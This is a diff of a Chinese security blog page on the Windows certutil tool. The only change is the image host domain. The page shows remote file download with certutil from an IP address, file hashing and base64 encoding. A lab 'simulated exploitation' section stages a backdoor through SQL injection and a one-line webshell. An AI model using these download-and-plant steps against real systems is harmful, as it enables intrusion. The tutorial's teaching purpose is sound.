@@ -2,7 +2,7 @@
 <p>应急响应中经常使用 certutil 命令来计算样本 Hash，渗透测试项目中也可以使用该命令来远程下载或写入文件来进行下一步动作，同时还可以解决换行问题。</p>
 <h3 id="📍-0x01-远程文件下载"><a href="#📍-0x01-远程文件下载" class="headerlink" title="📍 0x01 远程文件下载"></a>📍 0x01 远程文件下载</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c:\&gt; certutil -urlcache -split -f http://1.1.1.1/a.exe c:\temp\a.exe</span><br></pre></td></tr></table></figure>
 
-<p><img src="//naykcin.top/2019/12/01/certutil/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202020-02-03%20%E4%B8%8B%E5%8D%882.24.20.png" alt="屏幕快照 2020-02-03 下午2.24.20"></p>
+<p><img src="//mucfo.cn/2019/12/01/certutil/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202020-02-03%20%E4%B8%8B%E5%8D%882.24.20.png" alt="屏幕快照 2020-02-03 下午2.24.20"></p>
 <h3 id="📍-0x02-计算文件-Hash"><a href="#📍-0x02-计算文件-Hash" class="headerlink" title="📍 0x02 计算文件 Hash"></a>📍 0x02 计算文件 Hash</h3><h4 id="⚙️-MD4"><a href="#⚙️-MD4" class="headerlink" title="⚙️ MD4"></a>⚙️ MD4</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c:\&gt; certutil -hashfile lcx.exe MD4</span><br></pre></td></tr></table></figure>
 
 <h4 id="⚙️-MD5"><a href="#⚙️-MD5" class="headerlink" title="⚙️ MD5"></a>⚙️ MD5</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c:\&gt; certutil -hashfile lcx.exe MD5</span><br></pre></td></tr></table></figure>
@@ -13,7 +13,7 @@
 
 <h4 id="⚙️-SHA-512"><a href="#⚙️-SHA-512" class="headerlink" title="⚙️ SHA-512"></a>⚙️ SHA-512</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c:\&gt; certutil -hashfile lcx.exe SHA512</span><br></pre></td></tr></table></figure>
 
-<p><img src="//naykcin.top/2019/12/01/certutil/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202020-02-03%20%E4%B8%8B%E5%8D%882.08.36.png" alt="屏幕快照 2020-02-03 下午2.08.36"></p>
+<p><img src="//mucfo.cn/2019/12/01/certutil/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202020-02-03%20%E4%B8%8B%E5%8D%882.08.36.png" alt="屏幕快照 2020-02-03 下午2.08.36"></p>
 <h3 id="📍-0x03-任意文件编码"><a href="#📍-0x03-任意文件编码" class="headerlink" title="📍 0x03 任意文件编码"></a>📍 0x03 任意文件编码</h3><h4 id="⚙️-Base64-Encode"><a href="#⚙️-Base64-Encode" class="headerlink" title="⚙️ Base64 Encode"></a>⚙️ Base64 Encode</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c:\&gt; certutil -encode lcx.exe c:\temp\out.txt</span><br></pre></td></tr></table></figure>
 
 <h4 id="⚙️-Base64-Decode"><a href="#⚙️-Base64-Decode" class="headerlink" title="⚙️ Base64 Decode"></a>⚙️ Base64 Decode</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c:\&gt; certutil -decode c:\temp\out.txt c:\temp\demo.exe</span><br></pre></td></tr></table></figure>
@@ -27,10 +27,10 @@
 <h3 id="📍-0x05-模拟实战利用"><a href="#📍-0x05-模拟实战利用" class="headerlink" title="📍 0x05 模拟实战利用"></a>📍 0x05 模拟实战利用</h3><p>此次模拟实战的环境为目标系统具有 SQL 注入漏洞，</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">// Target - server 08</span><br><span class="line">172.16.232.140</span><br><span class="line"></span><br><span class="line">// Hacker - win 7</span><br><span class="line">172.16.232.136</span><br></pre></td></tr></table></figure>
 
-<h4 id="⚙️-生成后门"><a href="#⚙️-生成后门" class="headerlink" title="⚙️ 生成后门"></a>⚙️ 生成后门</h4><p><img src="//naykcin.top/2019/12/01/certutil/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202020-02-03%20%E4%B8%8B%E5%8D%882.37.15.png" alt="屏幕快照 2020-02-03 下午2.37.15"></p>
+<h4 id="⚙️-生成后门"><a href="#⚙️-生成后门" class="headerlink" title="⚙️ 生成后门"></a>⚙️ 生成后门</h4><p><img src="//mucfo.cn/2019/12/01/certutil/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202020-02-03%20%E4%B8%8B%E5%8D%882.37.15.png" alt="屏幕快照 2020-02-03 下午2.37.15"></p>
 <h4 id="⚙️-文件转码"><a href="#⚙️-文件转码" class="headerlink" title="⚙️ 文件转码"></a>⚙️ 文件转码</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c:\&gt; certutil -encode fuckthem.exe c:\temp\demo.txt</span><br></pre></td></tr></table></figure>
 
-<p><img src="//naykcin.top/2019/12/01/certutil/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202020-02-03%20%E4%B8%8B%E5%8D%882.41.54.png" alt="屏幕快照 2020-02-03 下午2.41.54"></p>
+<p><img src="//mucfo.cn/2019/12/01/certutil/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202020-02-03%20%E4%B8%8B%E5%8D%882.41.54.png" alt="屏幕快照 2020-02-03 下午2.41.54"></p>
 <h4 id="⚙️-写入后门"><a href="#⚙️-写入后门" class="headerlink" title="⚙️ 写入后门"></a>⚙️ 写入后门</h4><ol>
 <li><p>一句话木马上传写入</p>
 </li>
@@ -57,7 +57,7 @@
 
 </li>
 </ol>
-<p><img src="//naykcin.top/2019/12/01/certutil/a.png" alt="a"></p>
+<p><img src="//mucfo.cn/2019/12/01/certutil/a.png" alt="a"></p>
 </div><div class="article-meta" style="max-width:800px"></div><ul class="navication"><li class="home"><a href="/"><i class="icon icon-home"></i></a></li><li><a href="/2020/01/02/linux-emergency/"><i class="icon icon-arror-left"></i></a></li><li><a href="/2019/11/24/jsEncrypter/"><i class="icon icon-arror-right"></i></a></li></ul><div class="page-footer"><div class="top"><ul class="social"><li><a href="https://github.com/NickYan7" title="Github" target="_blank"><i class="icon icon-github"></i></a></li><li><a href="http://47.95.140.43/tu/721580653348_.pic.jpg" title="wechat" target="_blank"><i class="icon icon-wechat"></i></a></li></ul></div><div class="bottom"><p class="copyright">© 2022 Naykcin's Page</p></div></div></div><script>var wrap = document.getElementById('wrap');
 window.onload = function () {
   wrap.className += ' done';
